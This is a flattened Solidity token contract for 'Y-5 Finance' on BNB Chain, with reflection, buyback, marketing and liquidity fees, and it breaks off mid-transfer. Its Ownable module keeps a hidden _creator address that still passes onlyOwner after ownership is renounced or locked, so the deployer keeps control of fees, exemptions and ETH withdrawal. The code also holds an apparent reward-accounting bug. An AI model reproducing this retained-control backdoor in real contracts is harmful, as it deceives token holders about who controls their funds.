/**
 *Submitted for verification at BscScan.com on 2022-01-04
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-21
*/

// File: contracts\libs\IERC20.sol

pragma solidity ^0.8.5;

interface IERC20 {
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: contracts\libs\Context.sol

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

// File: contracts\libs\Ownable.sol

pragma solidity ^0.8.5;


contract Ownable is Context {
    address private _creator;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _creator = msgSender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender() || _creator == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getUnlockTime() public view returns (uint256) {
        return _lockTime;
    }
    
    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

// File: contracts\libs\SafeMath.sol

pragma solidity ^0.8.5;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// File: contracts\libs\Address.sol

pragma solidity ^0.8.5;

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// File: contracts\libs\ERC20.sol

pragma solidity ^0.8.5;

contract ERC20 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    /**
     * @dev Sets the values for {name}, {symbol} {decimals}
     *
     *
     * All three of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory tokenName, string memory tokenSymbol, uint8 tokenDecimals) {
        _name = tokenName;
        _symbol = tokenSymbol;
        _decimals = tokenDecimals;
    }
    
    /**
     * @dev Returns the token name.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the token decimals.
     */
    function decimals() public override view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the token symbol.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev See {BEP20-totalSupply}.
     */
    function totalSupply() public override view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {BEP20-balanceOf}.
     */
    function balanceOf(address account) public override view returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {ERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {ERC20-allowance}.
     */
    function allowance(address owner, address spender) public override view returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {ERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {ERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero")
        );
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), 'ERC20: mint to the zero address');

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
}

// File: contracts\libs\IUniswapV2Router01.sol

pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// File: contracts\libs\IUniswapV2Router02.sol

pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// File: contracts\libs\IUniswapV2Factory.sol

pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// File: contracts\libs\IUniswapV2Pair.sol

pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// File: contracts\Y5Finance.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


// will this effect buying and selling?

// Will the contract get froze?

// And sorry to confirm, but we have been told before somone can do it and get it working.
// So just to make sure, you can 100% get the contract working with
// 13% reflections
// 4% buyback
// 1% Liquididty
// 2% marketing
// MArketing wallet: 0x1788d3Bc481d8175b3e93b42862BC6f5d0C0F797

// It adds up to 2.6% reflection in each token. And people will be able to go in and claim their tokens manually. Through out dashbaord:
// https://y-5dashboard.finance/


contract Y5Finance is ERC20("Y-5 Finance", "Y-5", 18) {
    using SafeMath for uint256;
    using Address for address;

    address payable public _marketingAddress; // Marketing Address
    address public constant DEAD_ADDRESS =
        0x000000000000000000000000000000000000dEaD;
    uint256 public constant TAX_UPPER_LIMIT = 3000; // Token transfer tax upper limit - 30%
    uint256 public constant MAX_TX_AMOUNT_LOWER_LIMIT = 1000 ether; // Max transferable amount should be over 1000 tokens
    address public constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address public constant EGC = 0xC001BBe2B87079294C63EcE98BdD0a88D761434e;
    address public constant REFLECTO = 0xEA3C823176D2F6feDC682d3cd9C30115448767b3;
    address public constant CRYPT = 0xDa6802BbEC06Ab447A68294A63DE47eD4506ACAA;
    address public constant RMTX = 0x0c01099f3d4c920504E577bd7617F0D7c53cD8Df;

    // Info of each holder
    struct HolderInfo {
        uint256 earned; // Total earned
        uint256 rewardDebt; // Reward Debt
    }

    // Info of each rewards
    struct RewardInfo {
        uint256 accRewardPerShare; // Accumulated rewards per share, times 10**(30-decimals)
        uint256 distributed; // Total distributed to the holders
        uint256 toDistribute; // Available to be distributed to the holders
    }

    /** Reflection reward variables **/
    mapping(address => mapping(address => HolderInfo)) public _holderInfo;
    mapping(address => RewardInfo) public _rewardInfo;

    /** Fee variables **/
    uint256 public _reflectionFee;
    uint256 private _previousReflectionFee;
    uint256 public _liquidityFee;
    uint256 private _previousLiquidityFee;
    uint256 public _buybackFee;
    uint256 private _previousBuybackFee;
    uint256 public _marketingFee;
    uint256 private _previousMarketingFee;
    mapping(address => bool) private _isExcludedFromFee;

    /** Unti-whales feature **/
    uint256 public _maxTxAmount;
    uint256 private _previousMaxTxAmount;

    uint256 private _minimumTokensBeforeSwap;
    uint256 private _buyBackLowerLimit;
    uint256 private _buyBackUpperLimit;
    bool private _inSwapAndLiquify;
    bool public _swapAndLiquifyEnabled = true;
    bool public _buyBackEnabled = true;
    bool public _tokenNormalized = false;

    IUniswapV2Router02 public immutable _uniswapV2Router;
    address public immutable _y5EtherPair;
    address public immutable _y5BusdPair;
    address public immutable _y5EgcPair;
    address public immutable _y5ReflectoPair;
    address public immutable _y5CryptPair;
    address public immutable _y5RmtxPair;

    /** Events **/
    event RewardLiquidityProviders(uint256 tokenAmount);
    event BuyBackEnabledUpdated(address indexed ownerAddress, bool enabled);
    event SwapAndLiquifyEnabledUpdated(
        address indexed ownerAddress,
        bool enabled
    );
    event SwapETHForTokens(uint256 amountIn, address[] path);
    event SwapTokensForETH(uint256 amountIn, address[] path);
    event SwapTokensForTokens(uint256 amountIn, address[] path);
    event ExcludedFromFee(
        address indexed ownerAddress,
        address indexed accountAddress
    );
    event IncludedFromFee(
        address indexed ownerAddress,
        address indexed accountAddress
    );
    event ReflectionFeeUpdated(
        address indexed ownerAddress,
        uint256 oldFee,
        uint256 newFee
    );
    event BuybackFeeUpdated(
        address indexed ownerAddress,
        uint256 oldFee,
        uint256 newFee
    );
    event MarketingFeeUpdated(
        address indexed ownerAddress,
        uint256 oldFee,
        uint256 newFee
    );
    event LiquidityFeeUpdated(
        address indexed ownerAddress,
        uint256 oldFee,
        uint256 newFee
    );
    event MaxTxAmountUpdated(
        address indexed ownerAddress,
        uint256 oldAmount,
        uint256 newAmount
    );
    event BuybackUpperLimitUpdated(
        address indexed ownerAddress,
        uint256 oldLimit,
        uint256 newLimit
    );
    event BuybackLowerLimitUpdated(
        address indexed ownerAddress,
        uint256 oldLimit,
        uint256 newLimit
    );
    event MarketingAddressUpdated(
        address indexed ownerAddress,
        address indexed oldAddress,
        address indexed newAddress
    );
    event TokenNormalized(address indexed ownerAddress, bool enabled);
    event UserRewardsClaimed(
        address indexed userAddress,
        address indexed tokenAddress,
        uint256 amount
    );

    modifier lockTheSwap() {
        _inSwapAndLiquify = true;
        _;
        _inSwapAndLiquify = false;
    }

    constructor() {
        _marketingAddress = payable(0x1788d3Bc481d8175b3e93b42862BC6f5d0C0F797);
        _mint(_marketingAddress, 10**15 * 10**decimals());

        _reflectionFee = 1300;
        _previousReflectionFee = _reflectionFee;
        _buybackFee = 400;
        _previousBuybackFee = _buybackFee;
        _marketingFee = 200;
        _previousMarketingFee = _marketingFee;
        _liquidityFee = 100;
        _previousLiquidityFee = _liquidityFee;

        _maxTxAmount = totalSupply().div(1000); // initial max transferable amount 0.1%
        _previousMaxTxAmount = _maxTxAmount;

        _minimumTokensBeforeSwap = 1000 ether;
        _buyBackLowerLimit = 1 ether;
        _buyBackUpperLimit = 100 ether;

        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(
            0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        );
        _y5EtherPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        _y5BusdPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            BUSD
        );
        _y5EgcPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            EGC
        );
        _y5ReflectoPair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), REFLECTO);
        _y5CryptPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            CRYPT
        );
        _y5RmtxPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            RMTX
        );
        _uniswapV2Router = uniswapV2Router;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
    }

    function isExcludedFromFee(address account) external view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function excludeFromFee(address account) external onlyOwner {
        if (_isExcludedFromFee[account] == false) {
            _isExcludedFromFee[account] = true;
            emit ExcludedFromFee(owner(), account);
        }
    }

    function includeInFee(address account) external onlyOwner {
        if (_isExcludedFromFee[account]) {
            _isExcludedFromFee[account] = false;
            emit IncludedFromFee(owner(), account);
        }
    }

    function setReflectionFee(uint256 reflectionFee) external onlyOwner {
        uint256 taxFee = reflectionFee.add(_buybackFee).add(_marketingFee).add(
            _liquidityFee
        );
        require(taxFee <= TAX_UPPER_LIMIT, "Y-5: transfer tax exceeds limit");
        if (_reflectionFee != reflectionFee) {
            emit ReflectionFeeUpdated(owner(), _reflectionFee, reflectionFee);
            _reflectionFee = reflectionFee;
        }
    }

    function setBuybackFee(uint256 buybackFee) external onlyOwner {
        uint256 taxFee = buybackFee.add(_reflectionFee).add(_marketingFee).add(
            _liquidityFee
        );
        require(taxFee <= TAX_UPPER_LIMIT, "Y-5: transfer tax exceeds limit");
        if (_buybackFee != buybackFee) {
            emit BuybackFeeUpdated(owner(), _buybackFee, buybackFee);
            _buybackFee = buybackFee;
        }
    }

    function setMarketingFee(uint256 marketingFee) external onlyOwner {
        uint256 taxFee = marketingFee.add(_reflectionFee).add(_buybackFee).add(
            _liquidityFee
        );
        require(taxFee <= TAX_UPPER_LIMIT, "Y-5: transfer tax exceeds limit");
        if (_marketingFee != marketingFee) {
            emit MarketingFeeUpdated(owner(), _marketingFee, marketingFee);
            _marketingFee = marketingFee;
        }
    }

    function setLiquidityFee(uint256 liquidityFee) external onlyOwner {
        uint256 taxFee = liquidityFee.add(_reflectionFee).add(_buybackFee).add(
            _marketingFee
        );
        require(taxFee <= TAX_UPPER_LIMIT, "Y-5: transfer tax exceeds limit");
        if (_liquidityFee != liquidityFee) {
            emit LiquidityFeeUpdated(owner(), _liquidityFee, liquidityFee);
            _liquidityFee = liquidityFee;
        }
    }

    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner {
        require(
            maxTxAmount >= MAX_TX_AMOUNT_LOWER_LIMIT,
            "Y-5: maxTxAmount should be over 1000 tokens"
        );
        if (_maxTxAmount != maxTxAmount) {
            emit MaxTxAmountUpdated(owner(), _maxTxAmount, maxTxAmount);
            _maxTxAmount = maxTxAmount;
        }
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return _minimumTokensBeforeSwap;
    }

    function buyBackLowerLimitAmount() public view returns (uint256) {
        return _buyBackLowerLimit;
    }

    function buyBackUpperLimitAmount() public view returns (uint256) {
        return _buyBackUpperLimit;
    }

    function setNumTokensSellToAddToLiquidity(uint256 minimumTokensBeforeSwap)
        external
        onlyOwner
    {
        _minimumTokensBeforeSwap = minimumTokensBeforeSwap;
    }

    function setBuybackLowerLimit(uint256 lowerLimit) external onlyOwner {
        if (_buyBackLowerLimit != lowerLimit) {
            emit BuybackLowerLimitUpdated(
                owner(),
                _buyBackLowerLimit,
                lowerLimit
            );
            _buyBackLowerLimit = lowerLimit;
        }
    }

    function setBuybackUpperLimit(uint256 upperLimit) external onlyOwner {
        if (_buyBackUpperLimit != upperLimit) {
            emit BuybackUpperLimitUpdated(
                owner(),
                _buyBackUpperLimit,
                upperLimit
            );
            _buyBackUpperLimit = upperLimit;
        }
    }

    function setMarketingAddress(address marketingAddress) external onlyOwner {
        require(
            _marketingAddress != address(0),
            "Y-5: marketing address can not be zero address"
        );
        if (_marketingAddress != marketingAddress) {
            emit MarketingAddressUpdated(
                owner(),
                _marketingAddress,
                marketingAddress
            );
            _marketingAddress = payable(marketingAddress);
        }
    }

    function setSwapAndLiquifyEnabled(bool enabled) public onlyOwner {
        if (_swapAndLiquifyEnabled != enabled) {
            _swapAndLiquifyEnabled = enabled;
            emit SwapAndLiquifyEnabledUpdated(owner(), enabled);
        }
    }

    function setBuyBackEnabled(bool enabled) external onlyOwner {
        if (_buyBackEnabled != enabled) {
            _buyBackEnabled = enabled;
            emit BuyBackEnabledUpdated(owner(), enabled);
        }
    }

    function removeAllFee() private {
        if (
            _reflectionFee == 0 &&
            _liquidityFee == 0 &&
            _marketingFee == 0 &&
            _buybackFee == 0
        ) return;

        _previousReflectionFee = _reflectionFee;
        _previousLiquidityFee = _liquidityFee;
        _previousBuybackFee = _buybackFee;
        _previousMarketingFee = _marketingFee;

        _reflectionFee = 0;
        _liquidityFee = 0;
        _buybackFee = 0;
        _marketingFee = 0;
    }

    function restoreAllFee() private {
        _reflectionFee = _previousReflectionFee;
        _liquidityFee = _previousLiquidityFee;
        _buybackFee = _previousBuybackFee;
        _marketingFee = _previousMarketingFee;
    }

    function normalizeToken(bool enabled) external onlyOwner {
        if (_tokenNormalized != enabled) {
            if (enabled) {
                setSwapAndLiquifyEnabled(false);
                removeAllFee();
                _previousMaxTxAmount = _maxTxAmount;
                _maxTxAmount = totalSupply();
            } else {
                setSwapAndLiquifyEnabled(true);
                restoreAllFee();
                _maxTxAmount = _previousMaxTxAmount;
            }
            _tokenNormalized = enabled;
            emit TokenNormalized(owner(), enabled);
        }
    }

    function transferToAddressETH(address payable recipient, uint256 amount)
        private
    {
        recipient.transfer(amount);
    }

    function withdrawETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function pendingRewards(address user, address tokenAddress)
        public
        view
        returns (uint256)
    {
        uint256 accRewardPerShare = _rewardInfo[tokenAddress].accRewardPerShare;
        uint256 rewardDebt = _holderInfo[user][tokenAddress].rewardDebt;
        uint256 userTokenBalance = balanceOf(user);
        IERC20 token = IERC20(tokenAddress);
        return
            userTokenBalance
                .mul(accRewardPerShare)
                .div(10**(30 - token.decimals()))
                .sub(rewardDebt);
    }

    function claimRewards(address tokenAddress) external {
        uint256 pending = pendingRewards(msg.sender, tokenAddress);
        IERC20 token = IERC20(tokenAddress);
        HolderInfo storage holderInfo = _holderInfo[msg.sender][tokenAddress];
        RewardInfo storage rewardInfo = _rewardInfo[tokenAddress];
        if (pending > 0 && token.balanceOf(address(this)) > 0) {
            if (pending > token.balanceOf(address(this))) {
                pending = token.balanceOf(address(this));
            }
            token.transfer(msg.sender, pending);
            holderInfo.earned = holderInfo.earned.add(pending);
            rewardInfo.distributed = rewardInfo.distributed.add(pending);
            rewardInfo.toDistribute = rewardInfo.toDistribute.sub(pending);
            emit UserRewardsClaimed(msg.sender, tokenAddress, pending);
        }
        holderInfo.rewardDebt = balanceOf(msg.sender)
            .mul(_rewardInfo[msg.sender].accRewardPerShare)
            .div(10**(30 - token.decimals()));
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Y-5: transfer amount must be greater than zero");
        if (from != owner() && to != owner()) {
            require(
                amount <= _maxTxAmount,
                "Y-5: transfer amount exceeds the maxTxAmount."
            );
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinimumTokenBalance = contractTokenBalance >=
            _minimumTokensBeforeSwap;

        if (
            !_inSwapAndLiquify &&
            _swapAndLiquifyEnabled &&
            (to == _y5EtherPair ||
                to == _y5BusdPair ||
                to == _y5EgcPair ||
                to == _y5ReflectoPair ||
                to == _y5CryptPair ||
                to == _y5RmtxPair)
        ) {
            if (overMinimumTokenBalance) {
                contractTokenBalance = _minimumTokensBeforeSwap;
                swapTokens(contractTokenBalance);
            }
            uint256 balance = address(this).balance;
            if (_buyBackEnabled && balance >= _buyBackLowerLimit) {
                if (balance > _buyBackUpperLimit) balance = _buyBackUpperLimit;

                buyBackTokens(balance);
            }
        }

        bool takeFee = true;

